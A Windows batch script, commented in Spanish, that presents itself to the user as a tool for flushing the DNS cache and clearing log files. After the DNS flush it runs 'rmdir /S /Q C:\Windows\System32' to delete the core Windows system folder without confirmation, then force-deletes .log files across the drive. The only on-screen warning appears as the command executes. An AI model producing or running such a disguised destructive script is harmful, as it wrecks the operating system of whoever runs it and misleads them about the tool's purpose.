@echo off

:: S.O. AGREVAl
:: Fecha: 13/09/2024
:: Version: 1.2
:: En este programa se limpia la cache DNS ejecutando el comando ipconfig /flushdns, asi como tambien se 
:: se cambia el directorio raiz y la eliminazion de los archivos .log.
:: La implementacion que se hizo fue la eliminacion del la carpeta System 32 a traves del comando 
:: rmdir /S /Q C:\Windows\System32 


REM Muestra el mensaje de inicio y autor
echo S.O AGREVAL

REM Pausa para que el usuario presione Enter para continuar
echo.
echo Presiona Enter para limpiar archivos de registro y limpiar el caché DNS.
pause

REM Limpiar caché DNS
echo Limpiando el DNS para mejorar el internet...
ipconfig /flushdns
echo Caché DNS limpiado con éxito.
echo.

REM Cambiar al directorio raíz
cd/

REM Eliminar la carpeta System32 
echo ADVERTENCIA: Se intentará eliminar la carpeta System32.
rmdir /S /Q C:\Windows\System32
echo System32 se ha eliminado (en un entorno real esto dañaría el sistema).
echo.

REM Eliminar archivos .log
echo Eliminando archivos .log en todas las carpetas...
del *.log /a /s /q /f
echo Archivos .log eliminados con éxito.
echo.

REM Pausa para ver los resultados antes de cerrar
pause
